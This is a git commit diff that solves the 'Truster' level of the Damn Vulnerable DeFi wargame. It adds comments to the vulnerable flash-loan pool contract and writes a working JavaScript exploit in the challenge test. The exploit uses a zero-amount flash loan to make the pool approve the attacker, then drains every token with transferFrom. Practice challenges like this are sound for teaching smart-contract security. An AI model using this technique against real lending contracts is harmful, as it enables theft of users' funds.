ae892a52b06c2f55dab2d26e859eb376d78a7679
conache <C.conache@gmail.com>
2022-09-05 19:48:28 +0300

    Truster js solution

--- contracts/truster/TrusterLenderPool.sol
+++ contracts/truster/TrusterLenderPool.sol
@@ -11,32 +11,43 @@ import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
  * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
  */
 contract TrusterLenderPool is ReentrancyGuard {
-
     using Address for address;
 
     IERC20 public immutable damnValuableToken;
 
-    constructor (address tokenAddress) {
+    constructor(address tokenAddress) {
         damnValuableToken = IERC20(tokenAddress);
     }
 
     function flashLoan(
+        // borrowAmount can be 0
         uint256 borrowAmount,
         address borrower,
         address target,
         bytes calldata data
-    )
-        external
-        nonReentrant
-    {
+    ) external nonReentrant {
+        // No reentrancy vulnerable b/c of nonReentrant
         uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
         require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
-        
+
+        // There's no constraint for the borrower to be the same as the target
         damnValuableToken.transfer(borrower, borrowAmount);
+
+        // Ideas to implement in the target function call
+        // The first call shouldn't revert
+
+        // @idea1  - finding a way to approve transferring an amount of tokens
+        // from this contract to other address
+        // we'd leverage DVT as a second vulnerable entrypoint
+
+        // This function should send back the tokens b/c the borrower doesn't have the power
+        // @solution - we can directly try calling the DVT token contract, using 0 as borrowAmount
         target.functionCall(data);
 
         uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
-        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
+        require(
+            balanceAfter >= balanceBefore,
+            "Flash loan hasn't been paid back"
+        );
     }
-
 }
--- test/truster/truster.challenge.js
+++ test/truster/truster.challenge.js
@@ -1,46 +1,69 @@
-const { ethers } = require('hardhat');
-const { expect } = require('chai');
+const { ethers, web3 } = require("hardhat");
+const { expect } = require("chai");
 
-describe('[Challenge] Truster', function () {
-    let deployer, attacker;
+const APPROVE_JSON_INTERFACE = {
+  inputs: [
+    {
+      internalType: "address",
+      name: "spender",
+      type: "address",
+    },
+    {
+      internalType: "uint256",
+      name: "amount",
+      type: "uint256",
+    },
+  ],
+  name: "approve",
+  outputs: [
+    {
+      internalType: "bool",
+      name: "",
+      type: "bool",
+    },
+  ],
+  stateMutability: "nonpayable",
+  type: "function",
+};
 
-    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');
+describe("[Challenge] Truster", function () {
+  let deployer, attacker;
 
-    before(async function () {
-        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
-        [deployer, attacker] = await ethers.getSigners();
+  const TOKENS_IN_POOL = ethers.utils.parseEther("1000000");
 
-        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
-        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);
+  before(async function () {
+    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
+    [deployer, attacker] = await ethers.getSigners();
 
-        this.token = await DamnValuableToken.deploy();
-        this.pool = await TrusterLenderPool.deploy(this.token.address);
+    const DamnValuableToken = await ethers.getContractFactory("DamnValuableToken", deployer);
+    const TrusterLenderPool = await ethers.getContractFactory("TrusterLenderPool", deployer);
 
-        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);
+    this.token = await DamnValuableToken.deploy();
+    this.pool = await TrusterLenderPool.deploy(this.token.address);
 
-        expect(
-            await this.token.balanceOf(this.pool.address)
-        ).to.equal(TOKENS_IN_POOL);
+    await this.token.transfer(this.pool.address, TOKENS_IN_POOL);
 
-        expect(
-            await this.token.balanceOf(attacker.address)
-        ).to.equal('0');
-    });
+    expect(await this.token.balanceOf(this.pool.address)).to.equal(TOKENS_IN_POOL);
 
-    it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE  */
-    });
+    expect(await this.token.balanceOf(attacker.address)).to.equal("0");
+  });
 
-    after(async function () {
-        /** SUCCESS CONDITIONS */
+  it("Exploit", async function () {
+    const LenderAttackerFactory = await ethers.getContractFactory("LenderAttacker");
+    this.lenderAttacker = await LenderAttackerFactory.deploy(attacker.address, this.token.address);
 
-        // Attacker has taken all tokens from the pool
-        expect(
-            await this.token.balanceOf(attacker.address)
-        ).to.equal(TOKENS_IN_POOL);
-        expect(
-            await this.token.balanceOf(this.pool.address)
-        ).to.equal('0');
-    });
+    const poolBalance = await this.token.balanceOf(this.pool.address);
+    const approveCall = web3.eth.abi.encodeFunctionCall(APPROVE_JSON_INTERFACE, [attacker.address, poolBalance]);
+
+    await this.pool.flashLoan(0, attacker.address, this.token.address, approveCall);
+    await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, poolBalance);
+  });
+
+  after(async function () {
+    /** SUCCESS CONDITIONS */
+
+    // Attacker has taken all tokens from the pool
+    expect(await this.token.balanceOf(attacker.address)).to.equal(TOKENS_IN_POOL);
+    expect(await this.token.balanceOf(this.pool.address)).to.equal("0");
+  });
 });
-
